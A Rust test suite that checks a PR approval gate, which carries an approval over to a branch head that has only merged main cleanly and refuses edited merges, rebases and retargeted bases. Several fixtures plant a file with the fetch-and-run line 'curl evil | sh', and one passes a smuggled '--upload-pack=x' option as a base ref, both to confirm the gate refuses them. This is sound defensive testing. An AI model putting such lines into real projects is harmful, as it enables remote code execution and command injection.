//! TASK-1960: adversarial fixtures for the attested-approval carry-over.
//! Every test builds a real git repository with a bare `origin` whose
//! default branch is `main`; "publishing" main pushes it there, and the proof
//! fetches it back exactly as a ship would.
// trace:TASK-1960 | ai:claude

use super::*;
use std::path::Path;

const PR: u64 = 42;

pub(crate) fn git(repo: &Path, args: &[&str]) -> String {
    let out = crate::test_git::git_command()
        .arg("-C")
        .arg(repo)
        .args(args)
        .env("GIT_AUTHOR_DATE", "2026-09-22T00:00:00Z")
        .env("GIT_COMMITTER_DATE", "2026-09-22T00:00:00Z")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?} failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// `git` that is allowed to fail (an expected merge conflict).
fn git_may_fail(repo: &Path, args: &[&str]) {
    let _ = crate::test_git::git_command()
        .arg("-C")
        .arg(repo)
        .args(args)
        .output()
        .unwrap();
}

fn lines(n: usize, tag: &str) -> String {
    (1..=n).map(|i| format!("{tag} line {i}\n")).collect()
}

pub(crate) fn write(repo: &Path, file: &str, body: &str) {
    std::fs::write(repo.join(file), body).unwrap();
}

/// Replace line `n` (1-based) of `file`.
fn set_line(repo: &Path, file: &str, n: usize, text: &str) {
    let body = std::fs::read_to_string(repo.join(file)).unwrap();
    let mut ls: Vec<String> = body.lines().map(str::to_string).collect();
    ls[n - 1] = text.to_string();
    write(repo, file, &(ls.join("\n") + "\n"));
}

pub(crate) fn commit(repo: &Path, msg: &str) -> String {
    git(repo, &["add", "-A"]);
    git(repo, &["commit", "--quiet", "-m", msg]);
    git(repo, &["rev-parse", "HEAD"])
}

fn publish_main(repo: &Path) {
    git(repo, &["push", "--quiet", "origin", "main"]);
}

/// A clone plus its bare `origin` (kept alive alongside it).
pub(crate) struct Fixture {
    clone: tempfile::TempDir,
    _origin: tempfile::TempDir,
}

impl Fixture {
    pub(crate) fn path(&self) -> &Path {
        self.clone.path()
    }
}

/// A repo with `main` (a.txt, b.txt) and a PR branch `pr` that changes
/// a.txt line 5, approved at its tip. `main` then advances with an
/// unrelated change to b.txt. Returns (dir, approved sha).
pub(crate) fn fixture() -> (Fixture, String) {
    let origin = tempfile::tempdir().unwrap();
    git(origin.path(), &["init", "--quiet", "--bare", "-b", "main"]);
    let tmp = Fixture {
        clone: tempfile::tempdir().unwrap(),
        _origin: origin,
    };
    let repo = tmp.path();
    git(repo, &["init", "--quiet", "-b", "main"]);
    git(
        repo,
        &[
            "remote",
            "add",
            "origin",
            tmp._origin.path().to_str().unwrap(),
        ],
    );
    git(repo, &["config", "user.email", "aida@example.test"]);
    git(repo, &["config", "user.name", "AIDA Test"]);
    git(repo, &["config", "commit.gpgsign", "false"]);
    write(repo, "a.txt", &lines(30, "a"));
    write(repo, "b.txt", &lines(30, "b"));
    commit(repo, "base");
    git(repo, &["checkout", "--quiet", "-b", "pr"]);
    set_line(repo, "a.txt", 5, "a line 5 — reviewed change");
    let approved = commit(repo, "pr: reviewed change");
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 20, "b line 20 — main moved");
    commit(repo, "main: unrelated");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    (tmp, approved)
}

fn prove(repo: &Path, approved: &str, head: &str) -> Result<CarryOver, CarryOverRefusal> {
    prove_carry_over(repo, PR, "main", approved, head)
}

pub(crate) fn head(repo: &Path) -> String {
    git(repo, &["rev-parse", "HEAD"])
}

// (1) A clean main merge carries over.
#[test]
fn clean_main_merge_carries_over() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let proof = prove(repo, &approved, &h).expect("a clean main merge carries over");
    assert_eq!(proof.approved_sha, approved);
    assert_eq!(proof.new_head, h);
    assert_eq!(proof.merge_commits, vec![h.clone()]);
    assert_eq!(proof.approved_patch_id, proof.head_patch_id);
    assert_eq!(proof.base_ref, "origin/main");
    assert!(proof.head_range.ends_with(&format!("..{h}")));
    assert!(proof.approved_range.ends_with(&format!("..{approved}")));

    // Two successive main merges carry over too.
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 28, "b line 28 — main moved again");
    commit(repo, "main: again");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let proof = prove(repo, &approved, &head(repo)).expect("two clean merges carry over");
    assert_eq!(proof.merge_commits.len(), 2);
}

// (2) A conflict resolution that changes a PR hunk does not carry over.
#[test]
fn conflict_resolution_changing_a_pr_hunk_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "a.txt", 5, "a line 5 — main's competing edit");
    commit(repo, "main: conflicting");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git_may_fail(repo, &["merge", "--quiet", "--no-edit", "main"]);
    write(repo, "a.txt", &lines(30, "a"));
    set_line(repo, "a.txt", 5, "a line 5 — resolved differently");
    let h = commit(repo, "merge main, resolving the conflict");
    let err = prove(repo, &approved, &h).expect_err("a resolved conflict never carries over");
    assert_eq!(err, CarryOverRefusal::MergeConflicted { commit: h });
    assert!(
        err.reason().contains("resolved a conflict"),
        "{}",
        err.reason()
    );
}

// (3) A merge commit that also carries non-main changes (an evil merge)
// does not carry over.
#[test]
fn evil_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let h = commit(repo, "Merge branch 'main' into pr");
    let err = prove(repo, &approved, &h).expect_err("an evil merge never carries over");
    assert_eq!(err, CarryOverRefusal::MergeEdited { commit: h });
    assert!(
        err.reason().contains("changes of its own"),
        "{}",
        err.reason()
    );
}

// (3b) An evil merge that only re-indents a PR line — the edit plain
// `git patch-id` would ignore — still refuses.
#[test]
fn whitespace_only_evil_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    set_line(repo, "a.txt", 5, "    a line 5 — reviewed change");
    let h = commit(repo, "Merge branch 'main' into pr");
    assert!(prove(repo, &approved, &h).is_err());
}

// (4) An extra commit hidden behind a merge does not carry over — on the PR
// side, or smuggled in on the "main" side of the merge.
#[test]
fn extra_commit_hidden_behind_a_merge_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    set_line(repo, "a.txt", 25, "a line 25 — never reviewed");
    let hidden = commit(repo, "pr: sneaky");
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a hidden commit refuses");
    assert_eq!(err, CarryOverRefusal::NotAMerge { commit: hidden });

    // Main side: merge a branch that is main plus an unreviewed commit.
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "-b", "fake-main", "main"]);
    set_line(repo, "b.txt", 3, "b line 3 — not on main");
    commit(repo, "fake-main: sneaky");
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "fake-main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a non-main merge refuses");
    assert!(
        matches!(err, CarryOverRefusal::NotABaseMerge { .. }),
        "{err:?}"
    );
}

// (5) DOCUMENTED CHOICE: a rebase with an identical patch is REFUSED with a
// clear reason (rewritten history cannot be shown to add only base merges).
#[test]
fn identical_patch_rebase_is_refused_with_a_reason() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["rebase", "--quiet", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a rebase does not carry over");
    assert_eq!(err, CarryOverRefusal::NotDescendant);
    assert!(err.reason().contains("rebase"), "{}", err.reason());
}

// A clean merge whose main change lands inside the PR hunk's context changes
// the PR's own diff: the patch-id proof refuses even though git merged it.
#[test]
fn clean_merge_that_changes_the_pr_diff_refuses_on_patch_id() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "a.txt", 7, "a line 7 — main edit near the PR hunk");
    commit(repo, "main: near the hunk");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let err = prove(repo, &approved, &head(repo)).expect_err("a changed PR diff refuses");
    assert!(
        matches!(err, CarryOverRefusal::PatchChanged { .. }),
        "{err:?}"
    );
    assert!(
        err.reason().contains("own diff changed"),
        "{}",
        err.reason()
    );
}

// A base ref that does not yet contain the merged main commit (stale
// origin/main) fails closed.
#[test]
fn stale_base_ref_fails_closed() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "b.txt", 28, "b line 28 — not yet published");
    commit(repo, "main: unpublished");
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    assert!(prove(repo, &approved, &head(repo)).is_err());
}

fn moved(approved: &str, head: &str) -> crate::pr_ship::ApprovalHeadRefusal {
    crate::pr_ship::ApprovalHeadRefusal::Moved {
        reviewed_sha: approved.to_string(),
        head_sha: head.to_string(),
    }
}

// (6) The record is written, and re-read correctly on a second attempt; a
// record that disagrees with the fresh proof is replaced, and a forged record
// never stands in for a failing proof.
#[test]
fn record_is_written_and_reread_on_a_second_attempt() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let site = CarryOverSite::new(repo, Some("main"));

    let (first, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .expect("a moved head is eligible")
        .expect("first attempt carries over");
    assert_eq!(outcome, Some(RecordOutcome::Written));
    let stored = read_record(repo, PR, &h).expect("record written");
    assert_eq!(stored, first);
    let raw: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(record_path(repo, PR, &h)).unwrap()).unwrap();
    for key in [
        "approved_sha",
        "new_head",
        "approved_patch_id",
        "head_patch_id",
        "approved_range",
        "head_range",
        "base_ref",
        "recorded_at",
    ] {
        assert!(raw.get(key).is_some(), "record lacks {key}: {raw}");
    }

    let (second, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .unwrap()
        .expect("second attempt carries over");
    assert_eq!(
        outcome,
        Some(RecordOutcome::AlreadyRecorded {
            recorded_at: first.recorded_at.clone()
        })
    );
    assert!(second.same_proof(&first));
    assert_eq!(
        read_record(repo, PR, &h).unwrap().recorded_at,
        first.recorded_at
    );
    assert!(carry_over_line(&second, outcome.as_ref().unwrap()).contains("approval carried over"));

    // A tampered record is replaced by the fresh proof.
    let mut forged = first.clone();
    forged.head_patch_id = "0".repeat(40);
    std::fs::write(
        record_path(repo, PR, &h),
        serde_json::to_string(&forged).unwrap(),
    )
    .unwrap();
    let (_, outcome) = carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .unwrap()
        .unwrap();
    assert_eq!(outcome, Some(RecordOutcome::Replaced));
    assert!(read_record(repo, PR, &h).unwrap().same_proof(&first));

    // A forged "carried over" record for an evil head grants nothing.
    git(repo, &["reset", "--quiet", "--hard", &approved]);
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let evil = commit(repo, "Merge branch 'main' into pr");
    let mut forged = first;
    forged.new_head = evil.clone();
    std::fs::create_dir_all(record_path(repo, PR, &evil).parent().unwrap()).unwrap();
    std::fs::write(
        record_path(repo, PR, &evil),
        serde_json::to_string(&forged).unwrap(),
    )
    .unwrap();
    let refused = carry_over_for_refusal(&site, PR, &moved(&approved, &evil)).unwrap();
    assert!(
        matches!(refused, Err(CarryOverRefusal::MergeEdited { .. })),
        "{refused:?}"
    );
}

#[test]
fn only_a_moved_head_is_eligible() {
    let tmp = tempfile::tempdir().unwrap();
    let site = CarryOverSite::new(tmp.path(), Some("main"));
    let unreviewed = crate::pr_ship::ApprovalHeadRefusal::NoReviewedSha {
        head_sha: "a".repeat(40),
    };
    assert!(carry_over_for_refusal(&site, PR, &unreviewed).is_none());
    let unauthorized = crate::pr_ship::ApprovalHeadRefusal::Unauthorized {
        recorded_by: "implementer seat".into(),
    };
    assert!(carry_over_for_refusal(&site, PR, &unauthorized).is_none());
}

#[test]
fn unresolvable_inputs_refuse() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = head(repo);
    assert!(matches!(
        prove_carry_over(repo, PR, "--upload-pack=x", &approved, &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove_carry_over(repo, PR, "no-such-base", &approved, &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove(repo, "abc", &h),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
    assert!(matches!(
        prove(repo, &approved, &"f".repeat(40)),
        Err(CarryOverRefusal::Unresolvable { .. })
    ));
}

/// The `aida pr ship` gate end to end: an attested approval at the approved
/// commit, a head that only merged main — the gate pins the merge to the new
/// head, prints, and writes both records; an evil head refuses and says why.
#[test]
fn ship_gate_carries_over_and_refuses_with_the_reason() {
    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
    let approval = |sha: &str| RecordedVerdict {
        kind: VerdictKind::Approved,
        raw: "approved".into(),
        reviewed_sha: Some(sha.into()),
        recorded_at: Some("2026-09-23T00:00:00Z".into()),
        attestation: Some(RecorderAttestation {
            sha: sha.into(),
            human_at_tty: true,
            receipt_id: Some("rcpt".into()),
            identity: vec!["session:independent-reviewer".into()],
            ..Default::default()
        }),
        ..Default::default()
    };
    let policy = |v: &RecordedVerdict| {
        let mut p = crate::pr_ship::ShipApprovalPolicy {
            reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
            shipper: vec!["session:independent-shipper".into()],
            ..Default::default()
        };
        let a = v.attestation.as_ref().unwrap();
        let k = a.authority_key(v.recorded_at.as_deref()).unwrap();
        p.verified_authority.insert(k, a.identity.clone());
        p
    };

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    let h = head(repo);
    let v = approval(&approved);
    let site = CarryOverSite::new(repo, Some("main"));
    let pin = crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&h),
        &policy(&v),
        false,
        true,
        Some(&site),
    )
    .expect("a clean main merge ships on the carried-over approval");
    assert_eq!(
        pin.as_deref(),
        Some(h.as_str()),
        "pinned to the proven head"
    );
    assert!(read_record(repo, PR, &h).is_some());
    let activity = std::fs::read_to_string(repo.join(".aida/advisor-activity.jsonl")).unwrap();
    assert!(
        activity.contains("pr-merge-approval-carried-over"),
        "{activity}"
    );

    // Without a carry-over site the gate refuses exactly as before.
    assert!(crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&h),
        &policy(&v),
        false,
        true,
        None,
    )
    .is_err());

    git(repo, &["reset", "--quiet", "--hard", &approved]);
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    let evil = commit(repo, "Merge branch 'main' into pr");
    let err = crate::pr_cmd::pr_ship_approval_gate(
        repo,
        PR,
        std::slice::from_ref(&v),
        Some(&evil),
        &policy(&v),
        false,
        true,
        Some(&site),
    )
    .expect_err("an evil merge never ships on the old approval");
    let text = format!("{err:#}");
    assert!(text.contains("did not carry over"), "{text}");
    assert!(text.contains("changes of its own"), "{text}");
    assert!(read_record(repo, PR, &evil).is_none());
}

/// Merge main into the PR cleanly; returns the new head.
pub(crate) fn clean_merge(repo: &Path) -> String {
    git(repo, &["merge", "--quiet", "--no-edit", "main"]);
    head(repo)
}

/// From the approved commit, merge main but smuggle in a file; returns it.
pub(crate) fn evil_merge(repo: &Path, approved: &str) -> String {
    git(repo, &["reset", "--quiet", "--hard", approved]);
    git(
        repo,
        &["merge", "--quiet", "--no-commit", "--no-ff", "main"],
    );
    write(repo, "smuggled.sh", "curl evil | sh\n");
    commit(repo, "Merge branch 'main' into pr")
}

// (item 2) A retargeted base containing an unreviewed commit is refused:
// as the PR's base (it is not the protected default branch) and when merged
// into the PR while the base still reads `main` (the proof runs against the
// remote's default branch, which does not contain it).
#[test]
fn retargeted_base_with_an_unreviewed_commit_refuses() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "-b", "x", "main"]);
    set_line(repo, "b.txt", 3, "b line 3 — unreviewed, only on x");
    commit(repo, "x: unreviewed");
    git(repo, &["push", "--quiet", "origin", "x"]);
    git(repo, &["checkout", "--quiet", "pr"]);
    git(repo, &["merge", "--quiet", "--no-edit", "x"]);
    let h = head(repo);
    // Proven against the PR's own (retargeted) base, this would pass.
    assert!(prove_carry_over(repo, PR, "x", &approved, &h).is_ok());

    let retargeted = CarryOverSite::new(repo, Some("x"));
    let refused = carry_over_for_refusal(&retargeted, PR, &moved(&approved, &h)).unwrap();
    assert_eq!(
        refused.as_ref().map(|_| ()).unwrap_err(),
        &CarryOverRefusal::BaseNotProtected {
            base: "x".into(),
            protected: "main".into()
        }
    );
    assert!(refused.unwrap_err().reason().contains("default branch"));

    let on_main = CarryOverSite::new(repo, Some("main"));
    let refused = carry_over_for_refusal(&on_main, PR, &moved(&approved, &h)).unwrap();
    assert!(
        matches!(refused, Err(CarryOverRefusal::NotABaseMerge { .. })),
        "{refused:?}"
    );
    assert!(on_main.proven_base().is_none());
    assert!(read_record(repo, PR, &h).is_none());
}

#[test]
fn protected_base_reads_the_remote_default_branch() {
    let (tmp, _) = fixture();
    assert_eq!(protected_base(tmp.path()).unwrap(), "main");
    // A locally repointed origin/HEAD does not change it.
    git(tmp.path(), &["push", "--quiet", "origin", "pr"]);
    git(tmp.path(), &["remote", "set-head", "origin", "pr"]);
    assert_eq!(protected_base(tmp.path()).unwrap(), "main");
    let lone = tempfile::tempdir().unwrap();
    git(lone.path(), &["init", "--quiet"]);
    assert!(protected_base(lone.path()).is_err());
}

// (item 2) The merge re-checks the PR's base against the proven base.
#[test]
fn merge_time_base_must_match_the_proven_base() {
    assert_eq!(proven_base_refusal(PR, "main", Some("main")), None);
    let moved_base = proven_base_refusal(PR, "main", Some("x")).expect("retarget refuses");
    assert!(moved_base.contains("now targets `x`"), "{moved_base}");
    assert!(proven_base_refusal(PR, "main", None).is_some());
    assert!(proven_base_refusal(PR, "main", Some("  ")).is_some());

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    let site = CarryOverSite::new(repo, Some("main"));
    carry_over_for_refusal(&site, PR, &moved(&approved, &h))
        .unwrap()
        .unwrap();
    assert_eq!(site.proven_base().as_deref(), Some("main"));
}

// (item 3) A quiet (preflight) site proves without recording; the pinning
// gate records once.
#[test]
fn quiet_site_proves_without_recording() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    let quiet = CarryOverSite::quiet(repo, Some("main"));
    let (proof, outcome) = carry_over_for_refusal(&quiet, PR, &moved(&approved, &h))
        .unwrap()
        .unwrap();
    assert_eq!(proof.new_head, h);
    assert_eq!(outcome, None);
    assert!(
        read_record(repo, PR, &h).is_none(),
        "a quiet site writes nothing"
    );
}

// (item 4) The release/burndown merge path (`merge_path_approval_gate`):
// a clean merge returns the proven head, an evil merge refuses and says the
// approval did not carry over, and a base retargeted before the merge
// refuses.
#[test]
fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let v = RecordedVerdict {
        kind: VerdictKind::Approved,
        raw: "approved".into(),
        reviewed_sha: Some(approved.clone()),
        recorded_at: Some("2026-09-23T00:00:00Z".into()),
        attestation: Some(RecorderAttestation {
            sha: approved.clone(),
            human_at_tty: true,
            receipt_id: Some("rcpt".into()),
            identity: vec!["session:independent-reviewer".into()],
            ..Default::default()
        }),
        ..Default::default()
    };
    let mut policy = crate::pr_ship::ShipApprovalPolicy {
        reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
        shipper: vec!["session:independent-shipper".into()],
        ..Default::default()
    };
    let a = v.attestation.as_ref().unwrap();
    policy.verified_authority.insert(
        a.authority_key(v.recorded_at.as_deref()).unwrap(),
        a.identity.clone(),
    );
    let decide = |head: &str, base_now: Option<&str>| {
        let site = CarryOverSite::new(repo, Some("main"));
        let base_now = base_now.map(str::to_string);
        crate::pr_cmd::merge_path_approval_decision(
            repo,
            PR,
            std::slice::from_ref(&v),
            &policy,
            Some(head),
            &site,
            &|| base_now.clone(),
        )
    };

    let clean = clean_merge(repo);
    assert_eq!(
        decide(&clean, Some("main")),
        Ok(Some(clean.clone())),
        "the merge path pins to the proven head"
    );
    assert!(read_record(repo, PR, &clean).is_some());
    let retargeted = decide(&clean, Some("x")).expect_err("a retargeted base refuses");
    assert!(retargeted.contains("now targets `x`"), "{retargeted}");

    let evil = evil_merge(repo, &approved);
    let err = decide(&evil, Some("main")).expect_err("an evil merge refuses");
    assert!(err.contains("did not carry over"), "{err}");
    assert!(err.contains("changes of its own"), "{err}");
}

// ── TASK-1968: the verdict-corpus merge gate honours the same carry-over ────

/// Record a corpus verdict for `key` at `sha` under `repo`. Written after
/// every commit the test makes, so `commit`'s `add -A` never ships it.
fn record_corpus_verdict(repo: &Path, key: &str, verdict: &str, sha: &str) {
    let path = crate::review_verdict::verdict_path(repo, key);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(
        path,
        format!(r#"{{"verdict":"{verdict}","reviewed_sha":"{sha}","recorded_by":"reviewer-a"}}"#),
    )
    .unwrap();
}

fn corpus_gate(repo: &Path, ids: &[String], base: &str, head: &str) -> anyhow::Result<()> {
    crate::merge_hold::enforce_corpus_gate_before_merge(repo, PR, ids, Some(base), || {
        Some(head.to_string())
    })
}

// Approve at A, merge the base cleanly to B: the corpus gate clears at B,
// records nothing (the approval gate does), and the pure gate with no prover
// still refuses B exactly as before.
// trace:TASK-1968 | ai:claude
#[test]
fn corpus_gate_clears_a_clean_base_merge_of_the_approved_head() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    corpus_gate(repo, &[], "main", &h).expect("a clean base merge carries the approval over");
    assert!(
        read_record(repo, PR, &h).is_none(),
        "the corpus gate proves quietly"
    );

    let bodies = crate::merge_hold::corpus_gate_bodies(&[repo], PR, &[]).unwrap();
    assert!(matches!(
        crate::merge_hold::corpus_merge_gate(PR, &bodies, Some(&h)),
        crate::merge_hold::CorpusMergeGate::Refuse { .. }
    ));
}

// An edited merge, and a changed own diff (a commit behind a clean merge),
// still refuse, naming why the approval did not carry over.
// trace:TASK-1968 | ai:claude
#[test]
fn corpus_gate_refuses_an_edited_merge_or_a_changed_own_diff() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let evil = evil_merge(repo, &approved);
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    let text = format!("{:#}", corpus_gate(repo, &[], "main", &evil).unwrap_err());
    assert!(text.contains("did not carry over"), "{text}");
    assert!(text.contains("changes of its own"), "{text}");

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    set_line(repo, "a.txt", 25, "a line 25 — never reviewed");
    commit(repo, "pr: unreviewed");
    let h = clean_merge(repo);
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    let text = format!("{:#}", corpus_gate(repo, &[], "main", &h).unwrap_err());
    assert!(text.contains("did not carry over"), "{text}");
    assert!(text.contains("is not a merge"), "{text}");

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    git(repo, &["checkout", "--quiet", "main"]);
    set_line(repo, "a.txt", 7, "a line 7 — main edit near the PR hunk");
    commit(repo, "main: near the hunk");
    publish_main(repo);
    git(repo, &["checkout", "--quiet", "pr"]);
    let h = clean_merge(repo);
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    let text = format!("{:#}", corpus_gate(repo, &[], "main", &h).unwrap_err());
    assert!(text.contains("own diff changed"), "{text}");
}

// A standing refusal anywhere in the corpus is never carried past, a
// refusal is never itself carried over, and a PR that does not target the
// remote's default branch does not carry over.
// trace:TASK-1968 | ai:claude
#[test]
fn corpus_gate_never_carries_a_refusal_or_an_unprotected_base() {
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    let ids = vec!["BUG-9".to_string()];

    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    record_corpus_verdict(repo, "BUG-9", "request-changes", &approved);
    let text = format!("{:#}", corpus_gate(repo, &ids, "main", &h).unwrap_err());
    assert!(!text.contains("approval carried"), "{text}");

    std::fs::remove_file(crate::review_verdict::verdict_path(
        repo,
        &format!("PR-{PR}"),
    ))
    .unwrap();
    assert!(
        corpus_gate(repo, &ids, "main", &h).is_err(),
        "a refusal never carries over"
    );

    std::fs::remove_file(crate::review_verdict::verdict_path(repo, "BUG-9")).unwrap();
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    let text = format!("{:#}", corpus_gate(repo, &[], "release", &h).unwrap_err());
    assert!(
        text.contains("not the repository's default branch"),
        "{text}"
    );
}

// TASK-1965: the merge-time base refusals read as one sentence, without the
// run of spaces a lost line continuation left mid-sentence.
// trace:TASK-1968 | ai:claude
#[test]
fn proven_base_refusals_have_no_whitespace_gap() {
    for text in [
        proven_base_refusal(PR, "main", Some("x")).unwrap(),
        proven_base_refusal(PR, "main", None).unwrap(),
    ] {
        assert!(!text.contains("  "), "{text:?}");
    }
}

// TASK-1991: the advisor's ship-level sequence on one carried-over head:
// approve at A, update the branch cleanly to B, then the approval-head gate
// (the merge path's decision) pins B and the forge merge, whose chokepoint
// runs the corpus gate, merges B. A pure-git forge over the bare origin.
// trace:TASK-1951 trace:TASK-1991 | ai:claude
#[test]
fn approve_update_branch_then_both_ship_gates_clear_on_the_carried_head() {
    use crate::forge::{ChangeRef, Forge, MergeOptions, PureGitForge};
    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let carried = clean_merge(repo);
    record_corpus_verdict(repo, "TASK-42", "approved", &approved);

    let v = RecordedVerdict {
        kind: VerdictKind::Approved,
        raw: "approved".into(),
        reviewed_sha: Some(approved.clone()),
        recorded_at: Some("2026-09-23T00:00:00Z".into()),
        attestation: Some(RecorderAttestation {
            sha: approved.clone(),
            human_at_tty: true,
            receipt_id: Some("rcpt".into()),
            identity: vec!["session:independent-reviewer".into()],
            ..Default::default()
        }),
        ..Default::default()
    };
    let mut policy = crate::pr_ship::ShipApprovalPolicy {
        reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
        shipper: vec!["session:independent-shipper".into()],
        ..Default::default()
    };
    let a = v.attestation.as_ref().unwrap();
    policy.verified_authority.insert(
        a.authority_key(v.recorded_at.as_deref()).unwrap(),
        a.identity.clone(),
    );
    let site = CarryOverSite::new(repo, Some("main"));
    let pin = crate::pr_cmd::merge_path_approval_decision(
        repo,
        PR,
        std::slice::from_ref(&v),
        &policy,
        Some(&carried),
        &site,
        &|| Some("main".to_string()),
    )
    .expect("the approval gate carries the approval over");
    assert_eq!(pin.as_deref(), Some(carried.as_str()));

    let mut opts = MergeOptions::squash();
    opts.match_head = pin;
    let change = ChangeRef {
        id: 0,
        url: String::new(),
        branch: "pr".into(),
        base: "main".into(),
        title: Some("feat: reviewed change (TASK-42)".into()),
    };
    let merged = PureGitForge::new(repo)
        .merge_change(&change, &opts, &mut crate::network_retry::NoopSink)
        .expect("the corpus gate clears the carried head and the merge lands");
    assert!(merged.merged);
    let main_a = git(repo, &["show", "main:a.txt"]);
    assert!(main_a.contains("a line 5 — reviewed change"), "{main_a}");
}

// TASK-1991: the corpus carry-over refuses an approval with no reviewed
// sha, and an unparseable live verdict beside an approval.
// trace:TASK-1951 trace:TASK-1991 | ai:claude
#[test]
fn corpus_carry_over_refuses_a_shaless_approval_or_an_unparseable_body() {
    let (tmp, _approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    let path = crate::review_verdict::verdict_path(repo, &format!("PR-{PR}"));
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(
        &path,
        r#"{"verdict":"approved","recorded_by":"reviewer-a"}"#,
    )
    .unwrap();
    assert!(
        corpus_gate(repo, &[], "main", &h).is_err(),
        "an approval that names no reviewed sha carries nothing over"
    );

    let (tmp, approved) = fixture();
    let repo = tmp.path();
    let h = clean_merge(repo);
    record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
    let other = crate::review_verdict::verdict_path(repo, "BUG-9");
    std::fs::write(&other, "{ not json").unwrap();
    assert!(
        corpus_gate(repo, &["BUG-9".to_string()], "main", &h).is_err(),
        "an unparseable live verdict beside the approval refuses"
    );
}
